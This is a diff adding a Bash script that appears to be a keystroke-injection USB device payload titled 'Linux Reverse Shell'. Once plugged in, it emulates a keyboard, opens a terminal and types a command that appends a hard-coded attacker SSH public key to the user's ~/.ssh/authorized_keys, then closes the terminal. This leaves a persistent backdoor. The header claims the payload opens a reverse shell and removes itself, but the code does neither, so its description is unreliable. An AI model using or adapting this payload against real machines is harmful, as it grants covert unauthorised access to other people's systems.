@@ -1,0 +1,44 @@
+#!/bin/bash
+#
+# Title:         Linux Reverse Shell
+# Author:        tuzzmaniandevil
+# Version:       1.2
+#
+# Runs a script in the background that creates a reverse shell connection to the configured address and then removes itself.
+#
+# Magenta..................Setup
+# Yellow single blink......Executing
+# Green....................Finished
+
+
+# Start Setup
+LED SETUP
+
+# Gets Switch Position
+GET SWITCH_POSITION
+
+# Set Attack Mode
+ATTACKMODE HID
+
+# Get the switch position
+GET SWITCH_POSITION
+
+# Open a terminal
+RUN UNITY xterm
+Q DELAY 1000
+
+# Wait for terminal to open
+sleep 1
+LED STAGE1
+
+#Append your public key to the servers authorized users
+Q STRING "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCTpPKN9KOzVksiwuXOvkTnX1VeeYkDp7cxL3TJEcO8+dfXvfisouRIG8q76LYabG15UsDEvy1SfE5Ferhv28E+YPLfdQ6hXWVm8zmR8UXIvLg9204p5NBhxayzSW19U24tP07C6Z7/IEsb/Tbkso5oz5mCbVwUH2m7M+5+c5AQILY7+CCiUCsYRgqmGo9MMv66bELGF5oSWYRxqmTlSNSOyOl3ndfA8gc4DVRt5q/07Ryi2mRZEDtn9Cx4q8YlP2HjkxT3fZ52n4jeRh6CQHjvRHweS1CqBGzXZXdKs2QPJHQLSauGMndp3wPsFQ4XpkZtUxL+fC0x/Ang8om2vDWZ santosa4@carr215-08 >> ~/.ssh/authorized_keys"
+Q ENTER
+
+# Quit the terminal
+Q DELAY 1000
+Q STRING "exit"
+Q ENTER
+
+LED CLEANUP
+LED FINISH
